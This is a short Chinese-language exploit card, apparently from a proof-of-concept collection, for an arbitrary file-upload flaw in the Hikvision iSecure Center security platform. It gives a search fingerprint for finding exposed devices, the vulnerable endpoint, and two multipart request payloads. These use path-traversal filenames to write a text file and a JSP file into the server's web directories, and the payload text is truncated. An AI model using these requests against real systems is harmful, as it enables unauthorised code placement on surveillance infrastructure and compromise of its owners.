# 海康威视iSecureCenter综合安防管理平台svm文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`POST /svm/api/external/report HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: ip`　`Content-Length: 172`　`Host: xx.xx.xx.xx`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM7…`　`Content-Length: 308`

**请求体 / payload**
```
POC：\
`https://ip/svm/api/external/report`\
判断是否存在该漏洞\
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/1ndex.txt"
index
--00content0boundary00--

上传文件位置\
`https://ip/els/static/1ndex.txt`\
------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip
<%out.print("test");%>
------WebKitFormBoundary9PggsiM755PLa54a--

上传文件位置
https://xx.xx.xx.xx/portal/u…（脚本共 623 字，完整版见原文）
```

**其他**
- 海康威视iSecureCenter综合安防管理平台 svm文件上传漏洞: * 1、漏洞描述
* 2、影响版本
* 3、资产测绘
* 4、漏洞复现
  * POC1
  * POC2
***
- 版本: HIKVISION iSecure Center综合安防管理平台\